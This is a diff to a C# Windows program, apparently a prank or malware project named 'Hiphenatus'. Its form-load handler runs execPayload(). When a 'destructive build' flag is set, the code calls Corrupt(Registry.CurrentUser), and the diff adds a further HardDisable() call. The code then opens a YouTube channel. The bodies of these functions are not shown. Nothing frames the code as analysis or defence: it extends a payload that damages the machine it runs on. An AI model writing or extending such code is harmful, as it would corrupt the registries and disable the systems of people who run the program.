@@ -535,6 +535,7 @@ namespace Hiphenatus
             if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
             {
                 Corrupt(Registry.CurrentUser);
+                HardDisable();
             }
 
             Process.Start("https://www.youtube.com/@sudoUltimateQuack");
@@ -650,9 +651,6 @@ namespace Hiphenatus
             Thread.Sleep(1000);
             Console.WriteLine("ayo wtf");
         }
-
-
-
         private void Form1_Load(object sender, EventArgs e)
         {
             execPayload();
